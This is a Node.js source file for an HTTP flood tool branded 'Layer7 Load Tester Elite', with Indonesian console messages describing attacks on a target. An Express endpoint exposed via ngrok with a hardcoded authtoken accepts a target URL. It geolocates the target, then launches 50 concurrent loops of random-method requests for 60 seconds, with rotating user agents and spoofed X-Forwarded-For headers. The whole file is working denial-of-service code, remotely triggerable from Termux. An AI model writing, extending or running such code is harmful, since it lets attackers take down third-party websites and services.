require('colors');
const express = require('express');
const ngrok = require('ngrok');
const axios = require('axios');
const app = express();
const bodyParser = require('body-parser');
const crypto = require('crypto');

app.use(bodyParser.json());
let attackActive = false;
let targetInfo = {};
let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;

const showBanner = () => {
  console.log(`
  ██████╗ ██╗      ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝██║     ██║   ██║██║  ██║██████╔╝█████╗  ██║  ██║
  ██╔══██╗██║     ██║   ██║██║  ██║██╔══██╗██╔══╝  ██║  ██║
  ██████╔╝███████╗╚██████╔╝██████╔╝██████╔╝███████╗██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝ 
  `.cyan);
  console.log(`  Layer7 Load Tester Elite\n  Version: 2.0\n`.yellow);
};

const startNgrok = async () => {
  try {
    await ngrok.authtoken('2xclrXeyimoudAtLmDQu7DibbSJ_42dYjd7bccEoCS23svLnA');
    const url = await ngrok.connect(currentPort);
    console.log(`\n${' API UNTUK TERMUX ADALAH:'.bgMagenta.black} ${url.bold}`);
    console.log('[INFO]'.blue, 'BELUM TERHUBUNG KE TERMUX'.yellow);
    return url;
  } catch (e) {
    console.log('[ERROR]'.red, 'Gagal memulai Ngrok'.bold);
    process.exit(1);
  }
};

const attackTarget = async (target, duration) => {
  const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'];
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
    'Mozilla/5.0 (Linux; Android 12; SM-S906N)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
  ];
  
  const endTime = Date.now() + duration * 1000;
  attackActive = true;
  
  console.log(`\n${' MENYERANG KE TARGET:'.bgRed.black} ${target.underline}`);
  console.log(`${' DURASI SERANGAN:'.bgBlue.black} ${duration.toString().bold} detik\n`);
  
  const attackPromises = [];
  for (let i = 0; i < 50; i++) {
    attackPromises.push(new Promise(async (resolve) => {
      while (Date.now() < endTime && attackActive) {
        try {
          const currentMethod = methods[Math.floor(Math.random() * methods.length)];
          const currentAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
          
          await axios({
            method: currentMethod,
            url: target,
            headers: {
              'User-Agent': currentAgent,
              'Accept': 'text/html,application/xhtml+xml',
              'Accept-Language': 'en-US,en;q=0.9',
              'Cache-Control': 'no-cache',
              'Connection': 'keep-alive',
              'X-Forwarded-For': crypto.randomBytes(4).join('.')
            },
            timeout: 3000
          });
        } catch (e) {}
      }
      resolve();
    }));
  }
  
  await Promise.all(attackPromises);
  attackActive = false;
  console.log('\n'+' SELESAI! CEK INFO LENGKAP DI TERMUX '.bgGreen.black);
};

const getTargetInfo = async (target) => {
  try {
    const hostname = new URL(target).hostname.replace('www.', '');
    const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=66846719`);
    
    targetInfo = {
      ip: response.data.query,
      isp: response.data.isp,
      org: response.data.org,
      as: response.data.as,
      city: response.data.city,
      region: response.data.regionName,
      country: response.data.country,
      timezone: response.data.timezone,
      reverse: response.data.reverse,
      mobile: response.data.mobile,
      proxy: response.data.proxy,
      hosting: response.data.hosting,
      timestamp: new Date().toISOString()
    };
    return targetInfo;
  } catch (e) {
    return null;
  }
};

app.post('/attack', async (req, res) => {
  if (attackActive) return res.status(429).json({ error: 'Serangan sedang berjalan' });
  
  const { target, apiKey } = req.body;
  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Akses ditolak' });
  
  try {
    new URL(target);
    const info = await getTargetInfo(target);
    if (!info) return res.status(400).json({ error: 'Target tidak valid' });
    
    attackTarget(target, 60);
    res.status(200).json({ 
      status: 'success', 
      target, 
      duration: 60,
      info 
    });
  } catch (e) {
    res.status(400).json({ error: 'URL tidak valid' });
  }
});

app.get('/status', (req, res) => {
  res.json({ 
    status: attackActive ? 'active' : 'inactive',
    target: targetInfo,
    server: {
      port: currentPort,
      uptime: process.uptime()
    }
  });
});

showBanner();
app.listen(currentPort, () => {
  console.log(`${' Server running on port:'.bgCyan.black} ${currentPort.toString().bold}`);
  startNgrok();
});
